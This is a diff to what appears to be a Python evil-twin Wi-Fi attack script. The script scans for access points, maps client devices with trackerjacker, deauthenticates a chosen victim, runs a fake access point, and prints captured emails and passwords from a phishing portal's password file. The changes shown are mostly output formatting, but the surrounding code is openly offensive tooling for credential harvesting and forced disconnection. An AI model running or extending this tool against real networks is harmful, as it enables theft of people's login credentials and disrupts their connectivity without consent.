@@ -59,12 +59,12 @@ def checkFotRoot():
 
 def apRescanHandler(interface):
     os.system("clear")
-    print("\n\n\n===========\nScanned APs\n===========")
+    print("===========\nScanned APs\n===========")
     devices = (list(printAP(interface)))
-    attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
+    attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
     while attSsid == "R" or attSsid == "r":
         devices = (list(printAP(interface)))
-        attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
+        attSsid = input("Choose your attack AP or \"R\" fore rescan: ")
     return [devices[int(attSsid) - 1].ssid, devices[int(attSsid) - 1].address]
 
 def startAP(ssid, interface):
@@ -89,7 +89,7 @@ def stopAttack():
     print("Stopping attack..")
     os.system("sudo bash fake-ap-stop.sh")
     f = open("/srv/http/passwords.txt")
-    print("\n\n======================\nEmails and Passwords\n======================")
+    print("======================\nEmails and Passwords\n======================")
     print(f.read())
 
 
@@ -116,7 +116,9 @@ class Device:
         self.signal = signal
         self.vendor = vendor
 
-def printDevices(ssid):
+def printDevices(ssid, interface):
+    os.system('trackerjacker -i ' + interface + ' --map')
+
     stream = open("wifi_map.yaml", 'r')
     docs = yaml.load_all(stream)
 
@@ -138,7 +140,7 @@ def printDevices(ssid):
     for bssid, other in devices.items():
         device = Device(bssid, other['signal'], other['vendor'])
         ap.addDevice(device)
-    print("\n\n\n ")
+    # print("\n\n\n ")
     print("===============================\nDevices connected to " + ssid + "\n===============================")
     print("\033[91mAP ssid: " + apSsid + "\nAP bssid: " + ap.bssid)
     print("Connected divices list:\n")
@@ -185,16 +187,11 @@ if __name__ == "__main__":
     print("\nChoose interface for Mac scanning")
     interface = chooseDevice()
     goMonitorMode(interface)
-    os.system('trackerjacker -i ' + interface + ' --map')
-    os.system("clear")
+    mac_list = printDevices(ssid, interface)
 
-    mac_list = printDevices(ssid)
     x = chooseAttDevice(mac_list)
-
+    print("Device being attacked: " + x.bssid + "  " + x.vendor)
     os.system("clear")
-    print("----------------------")
-    print(x.bssid)
-    print("----------------------")
     deauth(x.bssid, addr, interface)
     os.system("clear")
     stopAttack()
